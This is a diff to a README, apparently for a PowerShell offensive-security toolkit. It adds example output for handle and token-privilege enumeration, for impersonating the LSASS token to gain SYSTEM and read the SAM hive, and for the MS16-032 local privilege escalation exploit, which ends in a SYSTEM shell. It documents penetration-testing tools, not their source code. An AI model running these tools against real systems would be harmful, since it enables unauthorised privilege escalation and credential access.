@@ -70,8 +70,27 @@ C:\PS> Detect-Debug
 Use NtQuerySystemInformation::SystemHandleInformation to get a list of open handles in the specified process, works on x32/x64.
 
 ```
-Get handles for PID 1234
-C:\PS> Get-Handles -ProcID 1234
+Get handles for PID 2288
+C:\PS> Get-Handles -ProcID 2288
+
+[>] PID 2288 --> notepad
+[+] Calling NtQuerySystemInformation::SystemHandleInformation
+[?] Success, allocated 449300 byte result buffer
+
+[>] Result buffer contains 28081 SystemHandleInformation objects
+[>] PID 2288 has 71 handle objects
+
+ PID ObjectType      HandleFlags        Handle KernelPointer AccessMask
+ --- ----------      -----------        ------ ------------- ----------
+2288 Directory       NONE               0x0004 0x88E629F0    0x00000000
+2288 File            NONE               0x0008 0x84560C98    0x00100000
+2288 File            NONE               0x000C 0x846164F0    0x00100000
+2288 Key             NONE               0x0010 0xA3067A80    0x00020000
+2288 ALPC Port       NONE               0x0014 0x8480C810    0x001F0000
+2288 Mutant          NONE               0x0018 0x8591FEB8    0x001F0000
+2288 Key             NONE               0x001C 0x96719C48    0x00020000
+2288 Event           NONE               0x0020 0x850C6838    0x001F0000
+...Snip...
 ```
 
 ### Get-TokenPrivs
@@ -79,8 +98,21 @@ C:\PS> Get-Handles -ProcID 1234
 Open a handle to a process and use Advapi32::GetTokenInformation to list the privileges associated with the process token.
 
 ```
-Get token privileges for PID 1234
-C:\PS> Get-TokenPrivs -ProcID 1234
+Get token privileges for PID 3836
+C:\PS> Get-TokenPrivs -ProcID 3836
+
+[?] PID 3836 --> calc
+[+] Process handle: 1428
+[+] Token handle: 1028
+[+] Token has 5 privileges:
+
+LUID Privilege
+---- ---------
+  19 SeShutdownPrivilege
+  23 SeChangeNotifyPrivilege
+  25 SeUndockPrivilege
+  33 SeIncreaseWorkingSetPrivilege
+  34 SeTimeZonePrivilege
 ```
 
 ## pwnd
@@ -92,6 +124,38 @@ Use the SeDebugPrivilege to duplicate the LSASS access token and impersonate it 
 ```
 Conjure LSASS into our midst! ;)
 C:\PS> Conjure-LSASS
+
+[?] SeDebugPrivilege is available!
+
+[+] Current process handle: 852
+
+[>] Calling Advapi32::OpenProcessToken
+[+] Token handle with TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY: 2000
+
+[?] SeDebugPrivilege is enabled!
+
+[>] Calling Advapi32::OpenProcessToken --> LSASS
+[+] Token handle with TOKEN_IMPERSONATE|TOKEN_DUPLICATE: 1512
+
+[>] Calling Advapi32::DuplicateToken --> LSASS
+[+] Duplicate token handle with SecurityImpersonation level: 2008
+
+[>] Calling Advapi32::SetThreadToken
+[+] Knock knock .. who's there .. LSASS
+[+] User context: SYSTEM
+
+C:\PS> whoami
+ERROR: Access is denied.
+ERROR: Access is denied.
+
+C:\PS> Get-ChildItem -Path hklm:SAM
+
+    Hive: HKEY_LOCAL_MACHINE\SAM
+
+
+SKC  VC Name                           Property
+---  -- ----                           --------
+  3   2 SAM                            {C, ServerDomainUpdates}
 ```
 
 ### Invoke-MS16-032
@@ -108,6 +172,33 @@ Targets:
 ```
 Sit back and watch the pwn!
 C:\PS> Invoke-MS16-032
+         __ __ ___ ___   ___     ___ ___ ___
+        |  V  |  _|_  | |  _|___|   |_  |_  |
+        |     |_  |_| |_| . |___| | |_  |  _|
+        |_|_|_|___|_____|___|   |___|___|___|
+
+                       [by b33f -> @FuzzySec]
+
+[?] Operating system core count: 2
+[>] Duplicating CreateProcessWithLogonW handle
+[?] Done, using thread handle: 956
+
+[*] Sniffing out privileged impersonation token..
+
+[?] Thread belongs to: svchost
+[+] Thread suspended
+[>] Wiping current impersonation token
+[>] Building SYSTEM impersonation token
+[?] Success, open SYSTEM token handle: 964
+[+] Resuming thread..
+
+[*] Sniffing out SYSTEM shell..
+
+[>] Duplicating SYSTEM token
+[>] Starting token race
+[>] Starting process race
+[!] Holy handle leak Batman, we have a SYSTEM shell!!
+
 ```
 
 ### Subvert-PE
